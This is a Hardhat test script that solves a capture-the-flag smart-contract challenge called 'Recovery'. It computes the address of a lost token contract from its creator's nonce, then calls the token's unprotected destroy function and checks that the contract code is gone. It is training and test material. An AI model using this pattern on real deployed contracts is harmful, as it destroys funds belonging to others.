const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Recovery Challenge Test", function () {
  let signers;
  let userAccount;
  let tokenContract;
  let recoveryContract;
  let transaction;

  before(async () => {
    signers = await ethers.getSigners();
    [userAccount] = signers;

    // Deploy the Recovery contract
    const RecoveryContractFactory = await ethers.getContractFactory("Recovery");
    recoveryContract = await RecoveryContractFactory.deploy();
    await recoveryContract.deployed();

    // Generate a token using the Recovery contract
    await recoveryContract.generateToken(
      "TestToken",
      ethers.utils.parseEther("1000")
    );
  });

  it("solves the challenge", async function () {
    // Compute the address of the SimpleToken contract
    const expectedTokenContractAddress = ethers.utils.getContractAddress({
      from: recoveryContract.address,
      nonce: 1,
    });

    // Attach to the SimpleToken contract
    const SimpleTokenContractFactory = await ethers.getContractFactory(
      "SimpleToken"
    );
    tokenContract = SimpleTokenContractFactory.attach(
      expectedTokenContractAddress
    );

    // Destroy the SimpleToken contract
    transaction = await tokenContract.destroy(userAccount.address);
    await transaction.wait();
  });

  after(async () => {
    // Check if the SimpleToken contract has been destroyed
    const tokenContractCode = await ethers.provider.getCode(
      tokenContract.address
    );
    expect(tokenContractCode, "Challenge not yet solved").to.equal("0x");
  });
});
